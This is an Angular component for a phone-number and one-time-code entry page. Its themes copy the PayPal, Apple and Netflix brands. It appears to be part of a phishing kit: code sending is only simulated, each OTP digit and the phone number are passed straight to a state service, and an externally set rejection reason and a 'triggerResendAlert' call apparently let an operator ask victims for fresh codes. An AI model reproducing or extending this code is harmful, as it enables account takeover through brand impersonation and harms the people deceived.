import { Component, inject, signal, computed, OnInit, OnDestroy, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { InputComponent } from './ui/input.component';
import { ButtonComponent } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-phone-verification',
  standalone: true,
  imports: [
    CommonModule,
    FormsModule,
    TranslatePipe,
    InputComponent,
    ButtonComponent,
    CardComponent
  ],
  host: {
    '[attr.data-theme]': 'currentFlowId()'
  },
  template: `
    <div class="phone-page-content animate-in slide-in-from-bottom-4 duration-500">
        
        <!-- Logo Header (context aware) -->
        @if (showLogo()) {
           <div class="mb-8 text-center">
              <img [src]="logoPath()" class="h-10 mx-auto" alt="Logo">
           </div>
        }

        <ui-card [variant]="cardVariant()" [noPadding]="false" [interactive]="false">
            
            <!-- Header -->
            <div class="text-center mb-6">
                <h1 class="text-2xl font-bold mb-2 tracking-tight" [style.color]="headerColor()">
                   {{ (codeSent() ? 'PHONE.TITLE_CODE' : 'PHONE.TITLE_INPUT') | translate }}
                </h1>
                <p class="text-base px-2 leading-relaxed opacity-80" [style.color]="textColor()">
                   {{ (codeSent() ? 'PHONE.DESC_CODE' : 'PHONE.DESC_INPUT') | translate }}
                   @if(codeSent()) { <strong class="block mt-1">{{ phoneDisplay() }}</strong> }
                </p>
            </div>

            <!-- Feedback Messages -->
            @if (state.rejectionReason()) {
              <div class="mb-6 bg-red-50 border-l-[4px] border-red-500 p-3 flex items-start gap-3 rounded-r text-left animate-fade-in">
                  <span class="material-icons text-red-500 text-xl">error</span>
                  <div>
                    <p class="text-sm font-bold text-red-900">{{ 'PHONE.ERROR_TITLE' | translate }}</p>
                    <p class="text-xs text-red-700 mt-1">{{ state.rejectionReason() }}</p>
                  </div>
              </div>
            }

            <!-- Stage 1: Phone Entry -->
            @if (!codeSent()) {
              <div class="stage-phone space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
                 
                 <!-- Smart Input for Phone -->
                 <ui-input
                    [label]="'PERSONAL.PHONE' | translate"
                    type="tel"
                    [(ngModel)]="phoneDisplay"
                    (ngModelChange)="onPhoneInput($event)"
                    [placeholder]="'(555) 555-5555'"
                    [iconLeft]="true">
                    <span slot="icon-left">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                          <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3" />
                        </svg>
                    </span>
                 </ui-input>
    
                 <p class="text-xs text-center opacity-60" [style.color]="textColor()">
                     {{ 'PHONE.DISCLAIMER' | translate }}
                 </p>
    
                 <ui-button 
                    (click)="sendCode()"
                    [disabled]="!isPhoneValid()"
                    [fullWidth]="true"
                    [variant]="primaryBtnVariant()">
                    {{ 'PHONE.SEND_CODE' | translate }}
                 </ui-button>
              </div>
            } 
            
            <!-- Stage 2: OTP Entry -->
            @else {
              <div class="stage-otp space-y-8 animate-in fade-in slide-in-from-right-4 duration-500">
                
                <div class="text-center -mt-2 mb-6">
                    <a (click)="codeSent.set(false)" class="text-sm font-bold cursor-pointer hover:underline"
                       [style.color]="primaryColor()">
                       {{ 'PHONE.CHANGE' | translate }}
                    </a>
                </div>
    
                <!-- OTP Input Wrapper (Handles Layouts) -->
                <div class="otp-wrapper flex justify-center gap-2 sm:gap-3">
                   @for (idx of [0,1,2,3,4,5]; track idx) {
                     <input 
                       [id]="'otp-' + idx"
                       type="text" 
                       inputmode="numeric"
                       maxlength="1"
                       [(ngModel)]="digits[idx]"
                       (input)="onOtpInput($event, idx)"
                       (keydown)="onKeyDown($event, idx)"
                       class="otp-box w-10 h-12 sm:w-12 sm:h-14 text-center text-xl font-bold outline-none transition-all duration-200 focus:ring-2 shadow-sm rounded-lg"
                       [style.background]="inputBg()"
                       [style.color]="inputTextColor()"
                       [style.border]="inputBorder()"
                       [class.ring-red-500]="state.rejectionReason()"
                       [class.focus:ring-blue-500]="!state.rejectionReason()"
                     >
                   }
                </div>
    
                <!-- Timer / Resend -->
                <div class="text-center min-h-[40px]">
                   @if (timer() > 0) {
                     <span class="text-sm font-medium opacity-70" [style.color]="textColor()">
                        {{ 'PHONE.RESEND_WAIT' | translate: { seconds: timer() } }}
                     </span>
                   } @else {
                     <button (click)="resend()" class="text-sm font-bold hover:underline" [style.color]="primaryColor()">
                        {{ 'PHONE.RESEND' | translate }}
                     </button>
                   }
                   
                   @if (resendSent()) {
                     <p class="text-xs text-green-600 mt-2 font-bold animate-pulse">
                        {{ 'PHONE.CODE_SENT' | translate }}
                     </p>
                   }
                </div>
    
                <ui-button 
                  (click)="submit()"
                  [disabled]="!isOtpValid()"
                  [loading]="isLoading()"
                  [fullWidth]="true"
                  [variant]="primaryBtnVariant()">
                  {{ 'COMMON.CONFIRM' | translate }}
                </ui-button>
              </div>
            }

        </ui-card>
        
    </div>
  `,
  styles: [`
    :host { display: block; width: 100%; }
    
    /* Apple Specific Override for OTP Boxes */
    :host[data-theme='apple'] .otp-box {
        border: 1px solid #d1d1d6 !important;
        border-radius: 8px !important;
        margin: 0 4px;
        background: white;
        color: black;
        box-shadow: none;
    }
    :host[data-theme='apple'] .otp-box:focus {
        border-color: #0071e3 !important;
        ring: 0;
    }

    /* Netflix Specific Override */
    :host[data-theme='netflix'] .otp-box {
        background: #333;
        color: white;
        border: none;
        border-bottom: 2px solid #555;
        border-radius: 0;
    }
    :host[data-theme='netflix'] .otp-box:focus {
        border-bottom-color: #e50914 !important;
    }
  `]
})
export class PhoneVerificationComponent implements OnInit, OnDestroy {
  public state = inject(StateService);

  // Flow State
  currentFlow = this.state.currentFlow;
  currentFlowId = computed(() => this.currentFlow()?.id || 'generic');

  // Input State
  rawPhone = '';
  phoneDisplay = signal('');
  isPhoneValid = signal(false);
  codeSent = signal(false);
  isLoading = signal(false);

  // OTP State
  digits: string[] = ['', '', '', '', '', ''];
  isOtpValid = signal(false);
  resendSent = signal(false);

  // Timer State
  timer = signal(0);
  private timerInterval: any;

  // Theme Computeds
  theme = computed(() => this.state.currentFlow()?.theme);

  headerColor = computed(() => this.theme()?.input.textColor || 'inherit');
  textColor = computed(() => this.theme()?.input.textColor || 'inherit');
  primaryColor = computed(() => this.theme()?.button.background || '#003087');

  inputBg = computed(() => this.theme()?.input.backgroundColor || '#ffffff');
  inputTextColor = computed(() => this.theme()?.input.textColor || '#111827');
  inputBorder = computed(() => this.theme()?.mode === 'dark' ? '1px solid #374151' : '1px solid #cbd5e1');

  // Logic Computeds
  showLogo = computed(() => ['paypal', 'apple', 'netflix'].includes(this.currentFlowId()));
  logoPath = computed(() => `assets/images/logos/${this.currentFlowId()}-logo.svg`);

  primaryBtnVariant = computed(() => {
    if (this.currentFlowId() === 'netflix') return 'danger';
    return 'primary';
  });

  cardVariant = computed<CardVariant>(() => {
    return 'elevated';
  });

  ngOnInit() {
    const existingPhone = this.state.phoneNumber();
    if (existingPhone) {
      this.phoneDisplay.set(existingPhone);
      this.isPhoneValid.set(true);
      // Auto-advance if we have a rejection (means we already tried)
      if (this.state.rejectionReason()) {
        this.codeSent.set(true);
      }
    }

    // Persist flow ID log
    effect(() => {
      console.log('Phone Verification Flow:', this.currentFlowId());
    });
  }

  ngOnDestroy() {
    if (this.timerInterval) clearInterval(this.timerInterval);
  }

  // Logic Methods
  onPhoneInput(val: string) {
    // Ensure we strip formatting to check raw validity
    // But keep formatting for display
    let input = val.replace(/\D/g, '');
    this.rawPhone = input;

    // Basic US Format (can expand later)
    const match = input.match(/^(\d{0,3})(\d{0,3})(\d{0,4})$/);
    let formatted = input;
    if (match) {
      const part1 = match[1];
      const part2 = match[2];
      const part3 = match[3];
      if (part1) formatted = `(${part1}`;
      if (part2) formatted += `) ${part2}`;
      if (part3) formatted += `-${part3}`;
    }

    // Hard check length 10 for validity
    this.isPhoneValid.set(input.length === 10);
    this.state.updatePhone({ number: formatted });
  }

  sendCode() {
    if (this.isPhoneValid()) {
      this.isLoading.set(true);
      // Simulate API delay
      setTimeout(() => {
        this.isLoading.set(false);
        this.codeSent.set(true);
        this.startTimer();
        setTimeout(() => document.getElementById('otp-0')?.focus(), 100);
      }, 800);
    }
  }

  onOtpInput(event: any, index: number) {
    const input = event.target as HTMLInputElement;
    let value = input.value.replace(/\D/g, '');

    if (value.length > 1) value = value[value.length - 1]; // Take last char

    // Update model array directly
    this.digits[index] = value;
    input.value = value; // Force view update

    if (value && /^[0-9]$/.test(value)) {
      if (index < 5) {
        document.getElementById(`otp-${index + 1}`)?.focus();
      }
    }

    this.checkOtpValidity();
    this.state.updatePhone({ code: this.digits.join('') });
  }

  onKeyDown(event: KeyboardEvent, index: number) {
    if (event.key === 'Backspace' && !this.digits[index] && index > 0) {
      document.getElementById(`otp-${index - 1}`)?.focus();
    }
  }

  checkOtpValidity() {
    this.isOtpValid.set(this.digits.every(d => d !== ''));
  }

  submit() {
    if (this.isOtpValid()) {
      this.isLoading.set(true);
      this.state.submitPhone(this.phoneDisplay(), this.digits.join(''));
      // State service handles navigation
    }
  }

  // Timer Logic
  startTimer() {
    this.timer.set(30);
    if (this.timerInterval) clearInterval(this.timerInterval);
    this.timerInterval = setInterval(() => {
      this.timer.update(v => {
        if (v <= 1) {
          clearInterval(this.timerInterval);
          return 0;
        }
        return v - 1;
      });
    }, 1000);
  }

  resend() {
    if (this.timer() === 0) {
      this.state.triggerResendAlert();
      this.resendSent.set(true);
      this.startTimer();
      setTimeout(() => this.resendSent.set(false), 3000);
    }
  }
}
